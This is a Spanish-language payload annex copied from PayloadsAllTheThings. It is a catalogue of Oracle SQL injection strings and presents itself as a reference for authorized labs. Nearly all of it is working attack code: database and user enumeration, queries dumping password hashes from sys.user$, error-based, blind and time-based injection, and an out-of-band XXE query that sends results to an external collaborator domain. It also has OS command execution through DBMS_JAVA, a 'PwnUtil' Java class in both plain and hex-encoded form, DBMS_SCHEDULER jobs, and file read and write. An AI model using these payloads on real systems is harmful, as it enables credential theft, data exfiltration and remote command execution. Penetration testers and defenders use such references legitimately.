# SQL injection: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [SQL Injection/OracleSQL Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/SQL%20Injection/OracleSQL%20Injection.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Oracle Inyección SQL / Oracle SQL Comentarios

### Variantes presentes en tablas o texto del apartado

```text
--
/**/
```

## 2. Oracle Inyección SQL / Oracle SQL Enumeration

### Variantes presentes en tablas o texto del apartado

```text
SELECT user FROM dual UNION SELECT * FROM v$version
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
SELECT banner FROM v$version WHERE banner LIKE 'TNS%';
SELECT BANNER FROM gv$version WHERE ROWNUM = 1;
SELECT version FROM v$instance;
SELECT UTL_INADDR.get_host_name FROM dual;
SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual;
SELECT UTL_INADDR.get_host_address FROM dual;
SELECT host_name FROM v$instance;
SELECT global_name FROM global_name;
SELECT name FROM V$DATABASE;
SELECT instance_name FROM V$INSTANCE;
SELECT SYS.DATABASE_NAME FROM DUAL;
SELECT sys_context('USERENV', 'CURRENT_SCHEMA') FROM dual;
```

## 3. Oracle Inyección SQL / Oracle SQL Base de datos Credentials

### Variantes presentes en tablas o texto del apartado

```text
SELECT username FROM all_users;
SELECT name, password from sys.user$;
SELECT name, spare4 from sys.user$;
```

## 4. Oracle SQL Metodología / Oracle SQL List Databases

```sql
SELECT DISTINCT owner FROM all_tables;
SELECT OWNER FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)
```

## 5. Oracle SQL Metodología / Oracle SQL List Tablas

```sql
SELECT table_name FROM all_tables;
SELECT owner, table_name FROM all_tables;
SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE '%PASS%';
SELECT OWNER,TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='<DBNAME>'
```

## 6. Oracle SQL Metodología / Oracle SQL List Columnas

```sql
SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';
SELECT COLUMN_NAME,DATA_TYPE FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='<TABLE_NAME>' AND OWNER='<DBNAME>'
```

## 7. Oracle Inyección SQL / Oracle SQL Basada en errores

### Variantes presentes en tablas o texto del apartado

```text
SELECT utl_inaddr.get_host_name((select banner from v$version where rownum=1)) FROM dual
SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual
SELECT ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user) FROM dual
SELECT to_char(dbms_xmlgen.getxml('select "'&#124;&#124;(select user from sys.dual)&#124;&#124;'" FROM sys.dual')) FROM dual
SELECT rtrim(extract(xmlagg(xmlelement("s", username &#124;&#124; ',')),'/s').getstringval(),',') FROM all_users
SELECT NVL(CAST(LENGTH(USERNAME) AS VARCHAR(4000)),CHR(32)) FROM (SELECT USERNAME,ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1))
XDBURITYPE((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%')).getblob()
XDBURITYPE((SELECT table_name FROM (SELECT ROWNUM r,table_name FROM all_tables ORDER BY table_name) WHERE r=1)).getclob()
AND 1337=(SELECT UPPER(XMLType(CHR(60)\|\|CHR(58)\|\|'~'\|\|(REPLACE(REPLACE(REPLACE(REPLACE((SELECT banner FROM v$version),' ','_'),'$','(DOLLAR)'),'@','(AT)'),'#','(HASH)'))\|\|'~'\|\|CHR(62))) FROM DUAL) -- -
AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'\|\|(SELECT banner FROM v$version)\|\|'~') -- -
'||PAYLOAD--
```

## 8. Oracle Inyección SQL / Oracle SQL Ciega

### Variantes presentes en tablas o texto del apartado

```text
SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';
SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)
SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);
SELECT COUNT(*) FROM user_tab_cols WHERE column_name = 'MESSAGE' AND table_name = 'LOG_TABLE';
SELECT message FROM log_table WHERE rownum=1 AND message LIKE 't%';
```

## 9. Oracle SQL Ciega / Oracle Ciega Con Substring Equivalent

### Variantes presentes en tablas o texto del apartado

```text
SUBSTR('foobar', <START>, <LENGTH>)
```

## 10. Oracle Inyección SQL / Oracle SQL Basada en tiempo

```sql
AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) 
AND 1337=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('RANDSTR',10) ELSE 1337 END)
```

## 11. Oracle Inyección SQL / Oracle SQL Fuera de banda

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

## 12. Oracle SQL Ejecución de comandos / Oracle Java Execution

```sql
    select * from dba_java_policy
    select * from user_java_policy
```

```sql
    exec dbms_java.grant_permission('SCOTT', 'SYS:java.io.FilePermission','<<ALL FILES>>','execute');
    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
    exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
```

````text
    ```sql
    SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\windows\\system32\\cmd.exe','/c', 'dir >c:\test.txt') FROM DUAL
    SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/bin/ls>/tmp/OUT2.LST') from dual
    ```
````

````text
    ```sql
    SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c /bin/ls>/tmp/OUT.LST') FROM DUAL
    ```
````

### Variantes presentes en tablas o texto del apartado

```text
DBMS_JAVA_TEST.FUNCALL()
DBMS_JAVA.RUNJAVA()
```

## 13. Oracle SQL Ejecución de comandos / Oracle Java Class

```sql
    BEGIN
    EXECUTE IMMEDIATE 'create or replace and compile java source named "PwnUtil" as import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = "";while ((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = "";while((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';
    END;

    BEGIN
    EXECUTE IMMEDIATE 'create or replace function PwnUtilFunc(p_cmd in varchar2) return varchar2 as language java name ''PwnUtil.runCmd(java.lang.String) return String'';';
    END;

    -- hex encoded payload
    SELECT TO_CHAR(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c61636520616e6420636f6d70696c65206a61766120736f75726365206e616d6564202270776e7574696c2220617320696d706f7274206a6176612e696f2e2a3b7075626c696320636c6173732070776e7574696c7b7075626c69632073746174696320537472696e672072756e28537472696e672061726773297b7472797b4275666665726564526561646572206d726561643d6e6577204275666665726564526561646572286e657720496e70757453747265616d5265616465722852756e74696d652e67657452756e74696d6528292e657865632861726773292e676574496e70757453747265616d282929293b20537472696e67207374656d702c207374723d22223b207768696c6528287374656d703d6d726561642e726561644c696e6528292920213d6e756c6c29207374722b3d7374656d702b225c6e223b206d726561642e636c6f736528293b2072657475726e207374723b7d636174636828457863657074696f6e2065297b72657475726e20652e746f537472696e6728293b7d7d7d''));
    EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f72207265706c6163652066756e6374696f6e2050776e5574696c46756e6328705f636d6420696e207661726368617232292072657475726e207661726368617232206173206c616e6775616765206a617661206e616d65202770776e7574696c2e72756e286a6176612e6c616e672e537472696e67292072657475726e20537472696e67273b'')); end;')) results FROM dual
```

```sql
    SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
```

## 14. Oracle SQL Ejecución de comandos / Package os_command

```sql
SELECT os_command.exec_clob('<COMMAND>') cmd from dual
```

## 15. Oracle SQL Ejecución de comandos / DBMS_SCHEDULER Jobs

```sql
DBMS_SCHEDULER.CREATE_JOB (job_name => 'exec', job_type => 'EXECUTABLE', job_action => '<COMMAND>', enabled => TRUE)
```

## 16. OracleSQL Archivo Manipulation / OracleSQL Read Archivo

```sql
utl_file.get_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
```

## 17. OracleSQL Archivo Manipulation / OracleSQL Write Archivo

```sql
utl_file.put_line(utl_file.fopen('/path/to/','file','R'), <buffer>)
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
